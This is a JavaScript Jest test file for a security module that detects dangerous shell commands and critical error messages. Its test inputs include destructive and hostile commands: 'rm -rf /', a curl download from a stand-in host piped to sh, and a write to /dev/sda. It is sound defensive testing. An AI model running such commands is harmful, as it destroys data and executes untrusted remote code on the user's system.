const {
    isDangerousCommand,
    isCriticalError,
    DANGEROUS_PATTERNS,
    CRITICAL_ERROR_PATTERNS,
} = require('./security');

describe('security', () => {
    describe('isDangerousCommand', () => {
        test('should detect rm -rf commands', () => {
            expect(isDangerousCommand('rm -rf /')).toBe(true);
            expect(isDangerousCommand('rm -rf /tmp/test')).toBe(true);
        });

        test('should detect sudo commands', () => {
            expect(isDangerousCommand('sudo apt-get install')).toBe(true);
            expect(isDangerousCommand('sudo rm file')).toBe(true);
        });

        test('should detect pipe to shell', () => {
            expect(isDangerousCommand('curl http://evil.com | sh')).toBe(true);
            expect(isDangerousCommand('cat script | bash')).toBe(true);
        });

        test('should detect eval commands', () => {
            expect(isDangerousCommand('eval "malicious code"')).toBe(true);
        });

        test('should detect dev null writes', () => {
            expect(isDangerousCommand('echo "data" > /dev/sda')).toBe(true);
        });

        test('should allow safe commands', () => {
            expect(isDangerousCommand('npm test')).toBe(false);
            expect(isDangerousCommand('grep pattern file.txt')).toBe(false);
            expect(isDangerousCommand('ls -la')).toBe(false);
            expect(isDangerousCommand('cat file.txt')).toBe(false);
        });

        test('should handle null/undefined/empty input', () => {
            expect(isDangerousCommand(null)).toBe(false);
            expect(isDangerousCommand(undefined)).toBe(false);
            expect(isDangerousCommand('')).toBe(false);
        });
    });

    describe('isCriticalError', () => {
        test('should detect JSON not found errors', () => {
            expect(isCriticalError('execution.json not found')).toBe(true);
            expect(isCriticalError('config.json not found at path')).toBe(true);
        });

        test('should detect file not found errors', () => {
            expect(isCriticalError('File not found: /path/to/file')).toBe(true);
        });

        test('should detect parse errors', () => {
            expect(isCriticalError('Failed to parse JSON')).toBe(true);
            expect(isCriticalError('Syntax error in file.js')).toBe(true);
            expect(isCriticalError('Unexpected token } in JSON')).toBe(true);
        });

        test('should detect permission errors', () => {
            expect(isCriticalError('Permission denied: /etc/passwd')).toBe(true);
        });

        test('should detect read errors', () => {
            expect(isCriticalError('Cannot read file')).toBe(true);
        });

        test('should detect ENOENT errors', () => {
            expect(isCriticalError('ENOENT: no such file or directory')).toBe(true);
        });

        test('should not flag non-critical errors', () => {
            expect(isCriticalError('Warning: deprecated function')).toBe(false);
            expect(isCriticalError('Test failed: expected 1 but got 2')).toBe(false);
            expect(isCriticalError('Phase not completed')).toBe(false);
        });

        test('should handle null/undefined/empty input', () => {
            expect(isCriticalError(null)).toBe(false);
            expect(isCriticalError(undefined)).toBe(false);
            expect(isCriticalError('')).toBe(false);
        });
    });

    describe('DANGEROUS_PATTERNS', () => {
        test('should have expected patterns', () => {
            expect(DANGEROUS_PATTERNS.length).toBeGreaterThan(0);
            expect(DANGEROUS_PATTERNS.every(p => p instanceof RegExp)).toBe(true);
        });
    });

    describe('CRITICAL_ERROR_PATTERNS', () => {
        test('should have expected patterns', () => {
            expect(CRITICAL_ERROR_PATTERNS.length).toBeGreaterThan(0);
            expect(CRITICAL_ERROR_PATTERNS.every(p => p instanceof RegExp)).toBe(true);
        });
    });
});
